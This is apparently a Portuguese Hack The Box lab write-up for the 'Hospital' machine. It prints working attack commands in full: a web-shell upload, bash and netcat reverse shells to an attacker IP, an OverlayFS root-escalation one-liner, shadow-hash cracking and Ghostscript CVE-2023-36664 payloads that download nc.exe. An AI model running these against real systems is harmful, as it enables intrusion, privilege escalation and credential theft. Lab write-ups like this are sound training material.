---
title: HTB Máquinas - Hospital
date: 2024-04-11 14:47:12 +0300
categories: [HTB, Máquinas]
tags: [máquinas, htb]     # TAG names should always be lowercase
---

# Hospital 

## Enumeração

Como sempre, iremos iniciar o pentesting usando o NMAP para verificar quais portas a aplicação usa. Irei verificar primeiramente com um comando simples.

```shell
nmap 10.10.11.241 

Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-14 18:02 -03
Nmap scan report for 10.10.11.241
Host is up (0.13s latency).
Not shown: 980 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
443/tcp  open  https
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
1801/tcp open  msmq
2103/tcp open  zephyr-clt
2105/tcp open  eklogin
2107/tcp open  msmq-mgmt
2179/tcp open  vmrdp
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy
```

Muitos serviços são hospedados nesse endereço. Vou começar pela porta 8080 e 443 já que essas portas estão hospedando os serviços https e http-proxy. 
Ao acessar o endereços ``10.10.11.241:8080`` e ``10.10.11.241:443``, somos direcionados a duas telas de login.
<br>
![](https://i.imgur.com/C1Z5U32.png)
![](https://i.imgur.com/c9Bu1Bd.png)
<br>
Fazendo um usuário em ``10.10.11.241:8080`` é possível identificar uma página de upload de arquivos. Ou seja, possívelmente esse sistema seja vulnerável a algum arquivo infectado.

![](https://i.imgur.com/IlHb3sh.png)
<br>

Antes de mais nada, vamos verificar quais diretórios temos disponíveis nessa aplicação.

```shell
gobuster dir -u http://10.10.11.241:8080 -w /home/kali/Documents/imp/wordlist/big.txt  

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.241:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /home/kali/Documents/imp/wordlist/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 279]
/.htpasswd            (Status: 403) [Size: 279]
/css                  (Status: 301) [Size: 317] [--> http://10.10.11.241:8080/css/]
/fonts                (Status: 301) [Size: 319] [--> http://10.10.11.241:8080/fonts/]
/images               (Status: 301) [Size: 320] [--> http://10.10.11.241:8080/images/]
/js                   (Status: 301) [Size: 316] [--> http://10.10.11.241:8080/js/]
/l                    (Status: 301) [Size: 315] [--> http://10.10.11.241:8080/l/]
/m                    (Status: 301) [Size: 315] [--> http://10.10.11.241:8080/m/]
/server-status        (Status: 403) [Size: 279]
/u                    (Status: 301) [Size: 315] [--> http://10.10.11.241:8080/u/]
/uploads              (Status: 301) [Size: 321] [--> http://10.10.11.241:8080/uploads/]
/vendor               (Status: 301) [Size: 320] [--> http://10.10.11.241:8080/vendor/]
/w                    (Status: 301) [Size: 315] [--> http://10.10.11.241:8080/w/]
Progress: 20476 / 20477 (100.00%)
===============================================================
Finished
===============================================================
```

Com a existência do diretório ```/uploads```, poderemos utiliza-lo como gatilho para o Powny Shell. Você pode verificar mais informações em ```https://github.com/flozz/p0wny-shell/blob/master/shell.php```.

## Exploração da vulnerabilidade

Em primeiro caso, o sistema não estava aceitando enviar o Shell por ele estar em formato .php. Mas com uma simples alteração de formato para .phar, foi possível enviar o shell. 

Após enviar o shell, podemos acessar pelo seguinte link: ```10.10.11.241:8080/uploads/shell.phar```.

![](https://i.imgur.com/130mvPg.png)

Com o Shell feito, é possível iniciar o Shell reverso para um melhor desempenho.

```www-data@webserver:…/html/uploads# /usr/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.159/4444 0>&1'```

``` shell
nc -lvpn 4444 
listening on [any] 4444 ...
10.10.11.241: inverse host lookup failed: Unknown host
connect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6608
bash: cannot set terminal process group (952): Inappropriate ioctl for device
bash: no job control in this shell
www-data@webserver:/var/www/html/uploads$ 
```

Identifiquei a versão do servidor, sendo ela a Ubuntu 23.04.
```shell
www-data@webserver:/var/www/html/uploads$ cat /etc/os-release
cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
VERSION_CODENAME=lunar
ID=ubuntu
ID_LIKE=debian
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
UBUNTU_CODENAME=lunar
LOGO=ubuntu-logo
```
Com essas informação em mãos, encontrei as vulnerabilidades CVE-2023-2640 e CVE-2023-32629

É possível verificar mais informações sobre em:
https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629

Para conseguirmos acesso como root, executaremos o seguinte comando:
```
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'
```

Agora iremos encontrar os usuários ativos do sistema usando ```cat /etc/passwd```, e como resultados encontramos o usuário:

```
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
```

Utilizando o comando ```cat /etc/shadow```, é possível encontrar a hash de da senha do drwilliams.

```
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

Utilizando o hashcat, iremos quebrar a hash.

```
hashcat hash.txt rockyou.txt
```
O resultado foi:
```
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```
Com isso, será possível acessar o endereço ``10.10.11.241:443`` com o usuário do drwilliams.
<br>
![](https://i.imgur.com/u9SADJm.png)

Esse sistema é referente a envios de e-mails. Caso o sistema não tenha sido desenvolvido corretamente, uma das formas de explorar vulnerabilidades nesses sistemas é utilizando GhostScript em arquivos .eps.

Para explorar essa vulnerabilidade iremos utilizar um código injetável referente ao [CVE-2023-36664](https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection?source=post_page-----edd713d784bb--------------------------------).

Primeiramente, iremos inicar um servidor http para que o nosso alvo faça o download do netcat.exe, da seguinte forma:
```
python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/)...
```

Após isso, iremos realizar o nosso primeiro payload de um aquivo .eps solicitando para que o servidor baixe do nosso servidor o nc.exe.

```
python3 CVE_2023_36664_exploit.py --inject --payload "curl 10.10.14.159:8000/nc.exe -o nc.exe" --filename file.eps
```

Após isso, enviaremos esse arquivo file.eps como anexo a um e-mail ao Drbrown. (Favor, relevar o bug dos icones, isso não deveria ter acontecido :DD)

![](https://i.imgur.com/SPUwOxM.png)

Após isso, vamos configurar o nc.exe que enviamos anteriormente com o endereço e porta da nossa máquina e enviaremos novamente esse arquivo em anexo.

```
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.159 4444 -e cmd.exe" --filename file.eps
```

Após isso, iremos realizar um novo arquivo inserindo o chamado ao nosso shell reverso.
```
python3 CVE_2023_36664_exploit.py --inject --payload "nc.exe 10.10.14.159 4444 -e nc.exe" --filename file.eps
```

Antes de enviar o próximo e-mail, inicie o seu netcat.
```
nc -lvnp 4444
listening on [any] 4444 ...
```

Após enviar o e-mail, nosso shell reverso estará pronto.

```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.159] from (UNKNOWN) [10.10.11.241] 6124
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\drbrown.HOSPITAL\Documents>
```

## User Flag

Para encontrar a user flag, basta navegar até o Desktop do drbrown.
```
C:\Users\drbrown.HOSPITAL>cd Desktop
C:\Users\drbrown.HOSPITAL\Desktop>type user.txt
type user.txt
7f785f1abc*******fbc61fd9502c6c9c
```

## Root Flag

Procurando pelo ghostscript, foi possível descobrir a senha do Rpcclient.

```
C:\Users\drbrown.HOSPITAL\Documents>type ghostscript.bat
type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

Após verificar Rpccliente, identifiquei que as informações de administrador é compartilhada com as de guest.

```
rpcclient $> querydispinfo
index: 0x2054 RID: 0x464 acb: 0x00020015 Account: $431000-R1KSAI1DGHMH	Name: (null)	Desc: (null)
index: 0xeda RID: 0x1f4 acb: 0x00004210 Account: Administrator	Name: Administrator	Desc: Built-in account for administering the computer/domain
index: 0x2271 RID: 0x641 acb: 0x00000210 Account: drbrown	Name: Chris Brown	Desc: (null)
index: 0x2272 RID: 0x642 acb: 0x00000210 Account: drwilliams	Name: Lucy Williams	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xf0f RID: 0x1f6 acb: 0x00020011 Account: krbtgt	Name: (null)	Desc: Key Distribution Center Service Account
index: 0x2073 RID: 0x465 acb: 0x00020011 Account: SM_0559ce7ac4be4fc6a	Name: Microsoft Exchange Approval Assistant	Desc: (null)
index: 0x207e RID: 0x46d acb: 0x00020011 Account: SM_2fe3f3cbbafa4566a	Name: SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}	Desc: (null)
index: 0x207a RID: 0x46c acb: 0x00020011 Account: SM_5faa2be1160c4ead8	Name: Microsoft Exchange	Desc: (null)
index: 0x2079 RID: 0x46b acb: 0x00020011 Account: SM_6e9de17029164abdb	Name: E4E Encryption Store - Active	Desc: (null)
index: 0x2078 RID: 0x46a acb: 0x00020011 Account: SM_75554ef7137f41d68	Name: Microsoft Exchange Federation Mailbox	Desc: (null)
index: 0x2075 RID: 0x467 acb: 0x00020011 Account: SM_9326b57ae8ea44309	Name: Microsoft Exchange	Desc: (null)
index: 0x2076 RID: 0x468 acb: 0x00020011 Account: SM_b1b9e7f83082488ea	Name: Discovery Search Mailbox	Desc: (null)
index: 0x2074 RID: 0x466 acb: 0x00020011 Account: SM_bb030ff39b6c4a2db	Name: Microsoft Exchange	Desc: (null)
index: 0x2077 RID: 0x469 acb: 0x00020011 Account: SM_e5b6f3aed4da4ac98	Name: Microsoft Exchange Migration	Desc: (null)
```
Nessa ocasião, podemos enviar o shell como convidado e acessar como administrador.

No diretório ```C:\xampp\htdocs>```, envie o P0wny Shell.

```
curl http://10.10.14.159:8080/shell.phar -o shell.php
```

Após isso, acesse ```https://10.10.11.241/shell.php``` e você poderá acessar como administrador e encontrar a flag root.

![](https://i.imgur.com/vkVb7Il.png)

Com isso, chegamos ao final de mais uma máquina! Lembre-se, todo o processo é bastate árduo e tentei ao máximo realizar de maneira didática! Até a próxima!

![](https://i.imgur.com/ptEpqXs.png)

